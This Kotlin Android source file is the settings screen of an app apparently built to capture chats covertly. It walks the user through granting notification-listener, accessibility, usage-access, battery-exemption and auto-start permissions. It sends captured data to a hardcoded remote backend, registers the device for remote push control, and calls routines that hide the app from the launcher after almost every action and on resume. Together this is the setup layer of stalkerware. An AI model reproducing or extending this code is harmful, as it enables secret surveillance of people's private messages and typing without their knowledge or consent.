package com.chats.capture.ui.fragments

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.chats.capture.R
import com.chats.capture.ui.DebugChatInputActivity
import com.chats.capture.managers.AutoStartManager
import com.chats.capture.managers.BatteryOptimizationManager
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.network.ApiClient
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppInstallationChecker
import com.chats.capture.utils.AppStateManager
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.utils.FcmTokenManager
import com.chats.capture.utils.PermissionChecker
import com.chats.capture.utils.PermissionStatus
import com.chats.capture.utils.ServerUrlValidator
import com.chats.capture.utils.ServiceStarter
import com.google.firebase.messaging.FirebaseMessaging
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.android.material.button.MaterialButton
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import timber.log.Timber

class SettingsFragment : Fragment() {
    
    private lateinit var editTextServerUrl: TextInputEditText
    private lateinit var buttonSaveServerUrl: MaterialButton
    private lateinit var textViewNotificationServiceStatus: android.widget.TextView
    private lateinit var textViewKeyboardServiceStatus: android.widget.TextView
    private lateinit var textViewBatteryOptimizationStatus: android.widget.TextView
    private lateinit var textViewLastSyncTime: android.widget.TextView
    private lateinit var textViewFcmStatus: android.widget.TextView
    private lateinit var textViewFcmToken: android.widget.TextView
    private lateinit var buttonOpenServiceSettings: MaterialButton
    private lateinit var buttonRefreshFcmToken: MaterialButton
    private lateinit var buttonOpenDebugChatInput: MaterialButton
    private lateinit var buttonCheckInstallation: MaterialButton
    private lateinit var switchCaptureEnabled: SwitchMaterial
    
    // Permissions UI
    private lateinit var textViewNotificationPermissionStatus: android.widget.TextView
    private lateinit var textViewAccessibilityPermissionStatus: android.widget.TextView
    private lateinit var textViewUsageStatsPermissionStatus: android.widget.TextView
    private lateinit var textViewBatteryPermissionStatus: android.widget.TextView
    private lateinit var textViewAutoStartPermissionStatus: android.widget.TextView
    private lateinit var buttonOpenNotificationSettings: MaterialButton
    private lateinit var buttonOpenAccessibilitySettings: MaterialButton
    private lateinit var buttonOpenUsageStatsSettings: MaterialButton
    private lateinit var buttonOpenBatterySettings: MaterialButton
    private lateinit var buttonOpenAutoStartSettings: MaterialButton
    private lateinit var buttonOpenAppPermissionsSettings: MaterialButton
    
    private lateinit var serviceMonitor: ServiceMonitor
    private lateinit var batteryOptimizationManager: BatteryOptimizationManager
    
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_settings, container, false)
    }
    
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        serviceMonitor = ServiceMonitor(requireContext())
        batteryOptimizationManager = BatteryOptimizationManager(requireContext())
        
        editTextServerUrl = view.findViewById(R.id.editTextServerUrl)
        buttonSaveServerUrl = view.findViewById(R.id.buttonSaveServerUrl)
        textViewNotificationServiceStatus = view.findViewById(R.id.textViewNotificationServiceStatus)
        textViewKeyboardServiceStatus = view.findViewById(R.id.textViewKeyboardServiceStatus)
        textViewBatteryOptimizationStatus = view.findViewById(R.id.textViewBatteryOptimizationStatus)
        textViewLastSyncTime = view.findViewById(R.id.textViewLastSyncTime)
        textViewFcmStatus = view.findViewById(R.id.textViewFcmStatus)
        textViewFcmToken = view.findViewById(R.id.textViewFcmToken)
        buttonOpenServiceSettings = view.findViewById(R.id.buttonOpenServiceSettings)
        buttonRefreshFcmToken = view.findViewById(R.id.buttonRefreshFcmToken)
        buttonOpenDebugChatInput = view.findViewById(R.id.buttonOpenDebugChatInput)
        buttonCheckInstallation = view.findViewById(R.id.buttonCheckInstallation)
        switchCaptureEnabled = view.findViewById(R.id.switchCaptureEnabled)
        
        // Permissions UI
        textViewNotificationPermissionStatus = view.findViewById(R.id.textViewNotificationPermissionStatus)
        textViewAccessibilityPermissionStatus = view.findViewById(R.id.textViewAccessibilityPermissionStatus)
        textViewUsageStatsPermissionStatus = view.findViewById(R.id.textViewUsageStatsPermissionStatus)
        textViewBatteryPermissionStatus = view.findViewById(R.id.textViewBatteryPermissionStatus)
        textViewAutoStartPermissionStatus = view.findViewById(R.id.textViewAutoStartPermissionStatus)
        buttonOpenNotificationSettings = view.findViewById(R.id.buttonOpenNotificationSettings)
        buttonOpenAccessibilitySettings = view.findViewById(R.id.buttonOpenAccessibilitySettings)
        buttonOpenUsageStatsSettings = view.findViewById(R.id.buttonOpenUsageStatsSettings)
        buttonOpenBatterySettings = view.findViewById(R.id.buttonOpenBatterySettings)
        buttonOpenAutoStartSettings = view.findViewById(R.id.buttonOpenAutoStartSettings)
        buttonOpenAppPermissionsSettings = view.findViewById(R.id.buttonOpenAppPermissionsSettings)
        
        // Set up permission buttons
        buttonOpenNotificationSettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        buttonOpenAccessibilitySettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        buttonOpenUsageStatsSettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(intent)
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        buttonOpenBatterySettings.setOnClickListener {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
            } else {
                val intent = Intent(Settings.ACTION_SETTINGS)
                startActivity(intent)
            }
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        buttonOpenAutoStartSettings.setOnClickListener {
            val intent = AutoStartManager.requestAutoStartPermission(requireContext())
            if (intent != null) {
                startActivity(intent)
            } else {
                // Fallback to app details settings
                val fallbackIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${requireContext().packageName}")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(fallbackIntent)
            }
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        // Open app's permission settings page (for runtime permissions)
        buttonOpenAppPermissionsSettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${requireContext().packageName}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        // Load saved server URL
        val prefs = requireContext().getSharedPreferences("capture_prefs", android.content.Context.MODE_PRIVATE)
        val defaultUrl = "https://backend-chat-yq33.onrender.com/"
        var serverUrl = prefs.getString("server_url", defaultUrl) ?: defaultUrl
        
        // Validate and fix server URL - reject localhost URLs
        if (serverUrl.contains("127.0.0.1") || serverUrl.contains("localhost") || 
            serverUrl.startsWith("http://https://") || serverUrl.isEmpty()) {
            Timber.w("Invalid server URL in preferences: $serverUrl, resetting to default")
            serverUrl = defaultUrl
            prefs.edit().putString("server_url", defaultUrl).apply()
        }
        
        editTextServerUrl.setText(serverUrl)

        // Capture enabled (global kill-switch)
        switchCaptureEnabled.isChecked = AppStateManager.areServicesEnabled(requireContext())
        switchCaptureEnabled.setOnCheckedChangeListener { _, isChecked ->
            AppStateManager.setServicesEnabled(requireContext(), isChecked)
            if (isChecked) {
                ServiceStarter.ensureServicesRunning(requireContext())
            } else {
                ServiceStarter.stopAllCaptureServices(requireContext())
            }
            // Re-hide app after settings change
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
            updateServiceStatus()
        }
        
        // Save server URL
        buttonSaveServerUrl.setOnClickListener {
            val url = editTextServerUrl.text?.toString()?.trim() ?: ""
            
            // Validate and save server URL
            val validatedUrl = ServerUrlValidator.validateAndSave(requireContext(), url)
            
            // Update UI if URL was changed
            if (validatedUrl != url) {
                editTextServerUrl.setText(validatedUrl)
            }
            
            // Reinitialize API client
            ApiClient.initialize(requireContext(), validatedUrl)
            
            // Re-hide app after settings change
            AppVisibilityManager.hideFromLauncher(requireContext())
            AppHider.ensureHidden(requireContext())
        }
        
        // Open service settings
        buttonOpenServiceSettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
        }
        
        // Refresh FCM token
        buttonRefreshFcmToken.setOnClickListener {
            refreshFcmToken()
        }

        // Open in-app debug chat input screen (for verifying typing/paste/voice input)
        buttonOpenDebugChatInput.setOnClickListener {
            startActivity(Intent(requireContext(), DebugChatInputActivity::class.java))
        }
        
        // Check installation status
        buttonCheckInstallation.setOnClickListener {
            checkInstallationStatus()
        }
        
        // Update service status
        updateServiceStatus()
    }
    
    private fun refreshFcmToken() {
        buttonRefreshFcmToken.isEnabled = false
        buttonRefreshFcmToken.text = "Refreshing..."
        
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            buttonRefreshFcmToken.isEnabled = true
            buttonRefreshFcmToken.text = "Refresh FCM Token"
            
            if (!task.isSuccessful) {
                Timber.e(task.exception, "Failed to get FCM token")
                updateServiceStatus()
                return@addOnCompleteListener
            }

            val token = task.result
            FcmTokenManager.saveToken(requireContext(), token)
            
            // Register device with new token
            val deviceRegistrationManager = DeviceRegistrationManager(requireContext())
            deviceRegistrationManager.registerDevice(token)
            
            Timber.d("FCM token refreshed")
            updateServiceStatus()
        }
    }
    
    override fun onResume() {
        super.onResume()
        // Re-hide app when returning to settings (in case it was shown)
        AppVisibilityManager.hideFromLauncher(requireContext())
        AppHider.ensureHidden(requireContext())
        updateServiceStatus()
    }
    
    private fun checkInstallationStatus() {
        val status = AppInstallationChecker.checkInstallationStatus(requireContext())
        
        val message = if (status.isInstalled) {
            """
            ✅ App Installed
            Package: ${status.packageName}
            Version: ${status.versionName} (${status.versionCode})
            App Name: ${status.appLabel}
            
            Component State: ${status.componentStateDescription}
            Hidden from Launcher: ${if (status.isHidden) "✅ YES" else "❌ NO"}
            """.trimIndent()
        } else {
            """
            ❌ App NOT Installed
            Error: ${status.error}
            """.trimIndent()
        }
        
        android.app.AlertDialog.Builder(requireContext())
            .setTitle("Installation Status")
            .setMessage(message)
            .setPositiveButton("OK", null)
            .setNeutralButton("Log to Logcat") { _, _ ->
                AppInstallationChecker.logInstallationStatus(requireContext())
            }
            .show()
    }
    
    private fun updateServiceStatus() {
        val status = PermissionChecker.getAllPermissionStatus(requireContext())
        
        val captureEnabled = AppStateManager.areServicesEnabled(requireContext())
        switchCaptureEnabled.isChecked = captureEnabled

        textViewNotificationServiceStatus.text =
            "Notification Service: ${if (status.notificationService) "Enabled" else "Disabled"} | Capture: ${if (captureEnabled) "ON" else "OFF"}"
        textViewKeyboardServiceStatus.text =
            "Keyboard Service: ${if (status.accessibilityService) "Enabled" else "Disabled"} | Capture: ${if (captureEnabled) "ON" else "OFF"}"
        textViewBatteryOptimizationStatus.text = "Battery Optimization: ${if (status.batteryOptimization) "Ignored" else "Not Ignored"}"
        
        // Update permissions card status
        updatePermissionsStatus(status)
        
        // Update last sync time
        val lastSyncTime = AppStateManager.getLastSyncTime(requireContext())
        val syncTimeText = if (lastSyncTime > 0) {
            val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
            "Last Sync: ${dateFormat.format(Date(lastSyncTime))}"
        } else {
            "Last Sync: Never"
        }
        textViewLastSyncTime.text = syncTimeText
        
        // Update colors based on status
        val enabledColor = requireContext().getColor(android.R.color.holo_green_dark)
        val disabledColor = requireContext().getColor(android.R.color.holo_red_dark)
        
        textViewNotificationServiceStatus.setTextColor(if (status.notificationService) enabledColor else disabledColor)
        textViewKeyboardServiceStatus.setTextColor(if (status.accessibilityService) enabledColor else disabledColor)
        textViewBatteryOptimizationStatus.setTextColor(if (status.batteryOptimization) enabledColor else disabledColor)
        
        // Update FCM status
        updateFcmStatus()
    }
    
    private fun updateFcmStatus() {
        val token = FcmTokenManager.getToken(requireContext())
        val tokenTimestamp = FcmTokenManager.getTokenTimestamp(requireContext())
        
        if (token != null) {
            textViewFcmStatus.text = "FCM Status: Active"
            textViewFcmStatus.setTextColor(requireContext().getColor(android.R.color.holo_green_dark))
            
            // Display token (truncated for security)
            val displayToken = if (token.length > 50) {
                "${token.take(25)}...${token.takeLast(25)}"
            } else {
                token
            }
            textViewFcmToken.text = "Token: $displayToken"
            
            // Show token age
            if (tokenTimestamp > 0) {
                val ageMinutes = (System.currentTimeMillis() - tokenTimestamp) / 60000
                textViewFcmToken.append(" (${ageMinutes}m ago)")
            }
        } else {
            textViewFcmStatus.text = "FCM Status: Not Available"
            textViewFcmStatus.setTextColor(requireContext().getColor(android.R.color.holo_red_dark))
            textViewFcmToken.text = "Token: Not available"
        }
    }
    
    private fun updatePermissionsStatus(status: PermissionStatus) {
        val enabledColor = requireContext().getColor(android.R.color.holo_green_dark)
        val disabledColor = requireContext().getColor(android.R.color.holo_red_dark)
        
        // Notification Access
        val notificationEnabled = status.notificationService
        textViewNotificationPermissionStatus.text = "Notification Access: ${if (notificationEnabled) "Enabled" else "Disabled"}"
        textViewNotificationPermissionStatus.setTextColor(if (notificationEnabled) enabledColor else disabledColor)
        buttonOpenNotificationSettings.text = if (notificationEnabled) "Manage" else "Enable"
        
        // Accessibility Service
        val accessibilityEnabled = status.accessibilityService
        textViewAccessibilityPermissionStatus.text = "Accessibility Service: ${if (accessibilityEnabled) "Enabled" else "Disabled"}"
        textViewAccessibilityPermissionStatus.setTextColor(if (accessibilityEnabled) enabledColor else disabledColor)
        buttonOpenAccessibilitySettings.text = if (accessibilityEnabled) "Manage" else "Enable"
        
        // Usage Stats
        val usageStatsEnabled = status.usageStats
        textViewUsageStatsPermissionStatus.text = "Usage Access: ${if (usageStatsEnabled) "Enabled" else "Disabled"}"
        textViewUsageStatsPermissionStatus.setTextColor(if (usageStatsEnabled) enabledColor else disabledColor)
        buttonOpenUsageStatsSettings.text = if (usageStatsEnabled) "Manage" else "Enable"
        
        // Battery Optimization
        val batteryIgnored = status.batteryOptimization
        textViewBatteryPermissionStatus.text = "Battery Optimization: ${if (batteryIgnored) "Ignored" else "Not Ignored"}"
        textViewBatteryPermissionStatus.setTextColor(if (batteryIgnored) enabledColor else disabledColor)
        buttonOpenBatterySettings.text = if (batteryIgnored) "Manage" else "Enable"
        
        // Auto-Start (check via AutoStartManager - it's an object, use directly)
        val autoStartEnabled = AutoStartManager.isAutoStartEnabled(requireContext())
        textViewAutoStartPermissionStatus.text = "Auto-Start: ${if (autoStartEnabled) "Enabled" else "Disabled"}"
        textViewAutoStartPermissionStatus.setTextColor(if (autoStartEnabled) enabledColor else disabledColor)
        buttonOpenAutoStartSettings.text = if (autoStartEnabled) "Manage" else "Enable"
    }
}
